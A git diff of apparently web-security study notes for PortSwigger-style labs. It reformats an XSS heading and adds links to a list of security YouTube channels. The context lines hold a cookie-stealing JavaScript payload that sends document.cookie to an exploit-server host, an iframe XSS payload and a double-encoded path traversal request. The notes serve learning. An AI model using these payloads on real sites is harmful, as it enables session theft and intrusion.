@@ -84,7 +84,7 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 [Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
->OnHashChange **#** XSS  
+>OnHashChange **'#'** XSS  
   
 ```JavaScript
 <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
@@ -1181,19 +1181,20 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 [YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
 Youtube channels:  
-1. Rana Khalil  
-2. David Bombal  
+1. [Rana Khalil](https://www.youtube.com/@RanaKhalil101/videos)  
+2. [David Bombal](https://www.youtube.com/@davidbombal/videos)  
 3. [intigriti](https://www.youtube.com/@intigriti/videos)  
-4. Seven Seas Security  
-5. LiveUnderflow  
-6. Tib3rius  
-7. John Hammond  
-8. TraceTheCode  
-9. Sabyasachi Paul  
-10. Mr Magneto  
-11. securityguideme  
-12. nu11 security  
-13. PortSwigger  
+4. [Seven Seas Security](https://www.youtube.com/@7SeasSecurity/videos)  
+5. [LiveUnderflow](https://www.youtube.com/@LiveUnderflow/videos)  
+6. [Tib3rius](https://www.youtube.com/@Tib3rius/videos)  
+7. [John Hammond](https://www.youtube.com/@_JohnHammond/videos)  
+8. [TraceTheCode](https://www.youtube.com/@TraceTheCode/videos)  
+9. [Sabyasachi Paul](https://www.youtube.com/@h0tPlug1n/videos)  
+10. [bmdyy](https://www.youtube.com/@bmdyy/videos)  
+11. [securityguideme](https://www.youtube.com/@securityguideme/videos)  
+12. [nu11 security](https://www.youtube.com/@Nul1Secur1ty/videos)  
+13. [PortSwigger(https://www.youtube.com/@PortSwiggerTV/videos)  
+14. [IppSec](https://www.youtube.com/@ippsec/videos)  
 
 
 ## Footnote
